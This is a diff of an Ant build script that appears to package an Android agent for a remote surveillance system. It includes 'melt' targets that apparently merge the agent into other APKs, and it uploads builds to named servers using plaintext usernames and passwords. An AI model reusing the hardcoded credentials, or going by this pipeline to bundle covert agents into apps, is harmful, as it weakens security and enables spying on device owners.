@@ -184,17 +184,6 @@
 				</case>
 				<case value="release">
 					<echo message="set release" />
-
-					<var name="isdebug" value="false" />
-					<var name="iscamera" value="false" />
-					<copy file="preprocess/config.release.bin" toFile="assets/c.bin" overwrite="true" />
-					<copy file="preprocess/resources.unpatched.bin" toFile="assets/r.bin" overwrite="true" />
-					<copy file="preprocess/dexguard-project.release.txt" toFile="dexguard-project.txt" overwrite="true" />
-				</case>
-				<case value="releasedebug">
-					<echo message="set releasedebug" />
-
-					<var name="isdebug" value="true" />
 					<var name="iscamera" value="false" />
 					<copy file="preprocess/config.release.bin" toFile="assets/c.bin" overwrite="true" />
 					<copy file="preprocess/resources.unpatched.bin" toFile="assets/r.bin" overwrite="true" />
@@ -204,15 +193,6 @@
 					<echo message="set merge" />
 
 					<var name="isdebug" value="false" />
-					<var name="iscamera" value="false" />
-					<copy file="preprocess/config.release.bin" toFile="assets/c.bin" overwrite="true" />
-					<copy file="preprocess/resources.unpatched.bin" toFile="assets/r.bin" overwrite="true" />
-					<copy file="preprocess/dexguard-project.merge.txt" toFile="dexguard-project.txt" overwrite="true" />
-				</case>
-				<case value="merge_debug">
-					<echo message="set merge" />
-
-					<var name="isdebug" value="true" />
 					<var name="iscamera" value="false" />
 					<copy file="preprocess/config.release.bin" toFile="assets/c.bin" overwrite="true" />
 					<copy file="preprocess/resources.unpatched.bin" toFile="assets/r.bin" overwrite="true" />
@@ -329,8 +309,6 @@
 
 	</target>
 
-
-
 	<target name="set-debug-v2" depends="init">
 		<set-cfg kind="debug" osversion="v2">
 		</set-cfg>
@@ -351,14 +329,11 @@
 		</set-cfg>
 	</target>
 
-	<target name="set-merge-debug" depends="init">
-		<set-cfg kind="merge_debug" osversion="v2">
-		</set-cfg>
-	</target>
-
 	<target name="set-debug-default" depends="init">
 		<set-cfg kind="debug" osversion="default">
 		</set-cfg>
+		
+		<delete dir="enc" />
 	</target>
 
 
@@ -400,8 +375,6 @@
 		<antcall target="build_var" />
 	</target>
 
-	<target name="build_nowork" depends="init,build_default,build_v2,merge">
-	</target>
 
 	<target name="build" depends="init">
 
@@ -413,6 +386,7 @@
 				<echo>Version @{osversion}</echo>
 
 				<var name="kind" value="release" />
+				<var name="isdebug" value="false" />
 
 				<echo>clean</echo>
 				<antcall target="clean" />
@@ -436,7 +410,7 @@
 		<antcall target="merge" />
 	</target>
 
-	<target name="build_releasedebug" depends="init">
+	<target name="build_debug" depends="init">
 
 		<for list="default,v2" param="osversion">
 			<sequential>
@@ -445,7 +419,8 @@
 				<echo message="===========================" />
 				<echo>Version @{osversion}</echo>
 
-				<var name="kind" value="releasedebug" />
+				<var name="kind" value="release" />
+				<var name="isdebug" value="true" />
 
 				<echo>clean</echo>
 				<antcall target="clean" />
@@ -467,41 +442,6 @@
 		</for>
 
 		<antcall target="merge" />
-	</target>
-
-
-	<target name="build_debug" depends="init">
-
-		<for list="default" param="osversion">
-			<sequential>
-				<echo message="==============" />
-				<echo message="===  DEBUG ===" />
-				<echo message="==============" />
-				<echo>Version @{osversion}</echo>
-
-				<var name="kind" value="debug" />
-
-				<echo>clean</echo>
-				<antcall target="clean" />
-
-				<echo message="bin/@{osversion}/${kind}/core.android" />
-				<set-cfg osversion="@{osversion}" kind="${kind}" />
-				<copy file="preprocess/config.release.bin" toFile="assets/c.bin" overwrite="true" />
-				<copy file="preprocess/resources.unpatched.bin" toFile="assets/r.bin" overwrite="true" />
-
-				<antcall target="encrypt-messages" />
-
-				<echo>call debug</echo>
-				<antcall target="debug" inheritAll="false" />
-				<!-- <var name="filename" value="bin/android_deviceinfo-release-unsigned.apk" /> -->
-				<var name="filename" value="bin/android_deviceinfo-debug.apk" />
-
-				<mkdir dir="output/${kind}/" />
-				<copy file="${filename}" toFile="output/${kind}/core.android.@{osversion}.apk" overwrite="true" />
-				<copy file="${filename}" toFile="server/core/core.android.default.apk" overwrite="true" />
-			</sequential>
-
-		</for>
 	</target>
 
 	<target name="repackmerge">
@@ -530,21 +470,6 @@
 		<echo>../../merge.rb C:\HT\Reversing\Android\CleanPackages\</echo>
 	</target>
 
-	<target name="merge_debug" depends="init">
-		<antcall target="clean" />
-		<set-cfg osversion="v2" kind="merge_debug" />
-		<echo message="=====================" />
-		<echo message=" BUILD merge_debug ==" />
-		<echo message="=====================" />
-		<antcall target="debug" inheritAll="false" />
-		<!-- <var name="filename" value="bin/android_deviceinfo-release-unsigned.apk" /> -->
-		<var name="filename" value="bin/android_deviceinfo-debug.apk" />
-		<mkdir dir="output/merge/" />
-		<copy file="${filename}" toFile="output/merge/core.android.melt.debug.apk" overwrite="true" />
-		<copy file="methodStartService.txt" toFile="output/merge/methodStartService.txt" overwrite="true" />
-		<echo>../../merge.rb C:\HT\Reversing\Android\CleanPackages\</echo>
-	</target>
-
 	<target name="servercore">
 		<delete dir="server/core" />
 		<mkdir dir="server/core" />
@@ -565,32 +490,6 @@
 		</copy>
 
 		<copy file="output/merge/core.android.melt.apk" toDir="server/core" overwrite="true" />
-		<copy file="preprocess/AndroidManifest.BACKGROUND.xml" toFile="server/core/AndroidManifest.xml" overwrite="true" />
-
-		<zip destfile="server/android_${version}.zip" basedir="server/core" />
-	</target>
-
-	<target name="servercoredebug">
-		<delete dir="server/core" />
-		<mkdir dir="server/core" />
-
-		<copy toDir="server/core" overwrite="true">
-			<fileset dir="server/template" excludes="version" />
-		</copy>
-
-		<copy toDir="server/core" overwrite="true">
-			<fileset dir="server/template" includes="version" />
-			<filterset>
-				<filter token="VERSION" value="${version}" />
-			</filterset>
-		</copy>
-
-		<copy toDir="server/core" overwrite="true">
-			<fileset dir="output/release/" />
-		</copy>
-
-		<copy file="output/merge/core.android.melt.apk" toDir="server/core" overwrite="true" />
-		<copy file="output/debug/core.android.default.apk" toDir="server/core" overwrite="true" />
 		<copy file="preprocess/AndroidManifest.BACKGROUND.xml" toFile="server/core/AndroidManifest.xml" overwrite="true" />
 
 		<zip destfile="server/android_${version}.zip" basedir="server/core" />
@@ -622,35 +521,25 @@
 		<copy file="./server/android_${version}.zip" toFile="/Volumes/SHARE/RELEASE/SVILUPPO/cores galileo/android.zip" overwrite="true" />
 	</target>
 
-	<target name="testcastore" depends="build">
+	<target name="test_castore" depends="build">
 		<antcall target="servercore" />
 		<updaterelease server="rcs-castore" login="zenobatch" password="zenop123" file="server/android_${version}.zip" />
 	</target>
 
-	<target name="updatecastoredebug" depends="build_debug,servercoredebug">
-		<updaterelease server="rcs-castore" login="zenobatch" password="zenop123" file="server/android_${version}.zip" />
-		<echo>ruby antlibs/rcs-core.rb -f RCS_0000001629 -n android -d rcs-castore -u zenobatch -p zenop123 -b build.params -o build/install.zip</echo>
-	</target>
-
-	<target name="updatecastorereleasedebug" depends="build_releasedebug,servercore">
-		<updaterelease server="rcs-castore" login="zenobatch" password="zenop123" file="server/android_${version}.zip" />
-		<echo>ruby antlibs/rcs-core.rb -n android -d rcs-castore -u zenobatch -p zenop123 -b build.params -o build/install.zip</echo>
-	</target>
-
-	<target name="updatecastore">
+	<target name="update_castore">
 		<updaterelease server="rcs-castore" login="zenobatch" password="zenop123" file="server/android_${version}.zip" />
 	</target>
 
-	<target name="updatepolluce">
+	<target name="update_polluce">
 		<updaterelease server="rcs-polluce" login="zeno" password="zenop123" file="server/android_${version}.zip" />
 	</target>
 
-	<target name="updatezeus">
+	<target name="update_zeus">
 		<updaterelease server="zeus" login="admin" password="adminp123" file="/server/android_${version}.zip" />
 		<!-- <copy file=".\server\blackberry_${version}.zip" toFile="W:\RELEASE\SVILUPPO\cores daVinci\android.zip" overwrite="true" /> -->
 	</target>
 
-	<target name="updateminotauro">
+	<target name="update_minotauro">
 		<updaterelease server="rcs-minotauro" login="zeno" password="zenop123" file="server/android_${version}.zip" />
 	</target>
 
